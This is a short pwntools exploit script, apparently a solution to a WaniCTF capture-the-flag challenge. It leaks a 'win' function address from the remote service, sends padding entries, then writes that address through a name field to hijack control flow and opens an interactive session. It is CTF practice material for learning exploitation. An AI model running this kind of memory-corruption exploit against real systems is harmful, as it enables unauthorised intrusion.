from pwn import *
context(arch='amd64',terminal=['tmux','new-window'])

local = False
fname = './chall'
host = 'chal-lz56g6.wanictf.org'
port = 9004

r = remote(host,port) if not local else process(["/glibc/2.34/64/lib/ld-linux-x86-64.so.2",fname],env={"LD_PRELOAD":"/glibc/2.34/64/lib/libc.so.6"})

def leak_show_flag():
    log.info('... get win address')
    l = r.recvline().decode()
    return int(l.split('=')[1].strip(),16)

def send_user(name, cal, amount):
    r.recvuntil(b':')
    log.info(f'... sending name {name}')
    r.sendline(name)
    r.recvuntil(b':')
    log.info(f'... sending calories {cal}')
    r.sendline(cal)
    r.recvuntil(b':')
    log.info(f'... sending amount {amount}')
    r.sendline(amount)




if __name__ == '__main__':
    win = leak_show_flag()+0x17
    for i in range(3):
        send_user(b'a',b'2',b'1')
    
    if local:
        gdb.attach(r,'''
        ''')
    
    send_user(p64(win),b'z',b'z')
    r.interactive()
